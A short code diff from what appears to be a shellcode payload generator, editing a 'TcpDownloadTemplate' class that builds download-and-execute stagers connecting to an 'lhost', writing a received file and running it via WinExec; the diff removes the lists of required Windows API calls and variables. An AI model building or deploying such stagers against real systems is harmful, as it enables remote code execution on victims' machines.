@@ -30,26 +30,6 @@ from ..encode import encode_dword, encode_word, safe_push_dword, safe_push_word_
 
 
 class TcpDownloadTemplate(PayloadTemplate):
-    REQUIRED_FUNCTIONS = (
-        "LoadLibraryA",
-        "WSAStartup",
-        "WSASocketA",
-        "connect",
-        "recv",
-        "closesocket",
-        "VirtualAlloc",
-        "CreateFileA",
-        "WriteFile",
-        "CloseHandle",
-        "WinExec",
-    )
-    REQUIRED_VARIABLES = (
-        "socket_handle",
-        "file_handle",
-        "virt_buf",
-        "bytes_total",
-        "bytes_recvd",
-    )
 
     def emit(self, layout, config: TemplateConfig) -> str:
         ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
